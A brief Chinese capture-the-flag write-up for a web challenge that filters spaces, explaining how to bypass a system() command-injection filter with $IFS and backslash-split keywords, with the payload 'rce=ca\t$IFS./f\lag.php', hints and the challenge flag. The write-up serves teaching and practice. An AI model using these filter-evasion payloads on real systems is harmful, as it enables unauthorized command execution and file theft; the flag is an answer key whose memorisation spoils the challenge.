## 题目描述

哎呀，空格都没了，呜呜呜~

## 题解

system()函数shell命令执行绕过trick，空格被过滤可用	`$IFS`，可通过`\`来绕过对关键词的过滤

`rce=ca\t$IFS./f\lag.php`

但是需要注意，浏览器会将输出的php 语句注释，可以查看源代码，或者使用tac反向输出，就不会注释

#### hint

1、空格可以使用啥来替代？

2、\

#### flag

falg{Rc3_15_th3_m0st_Intere5t1ng_vu1nerability_!_!}



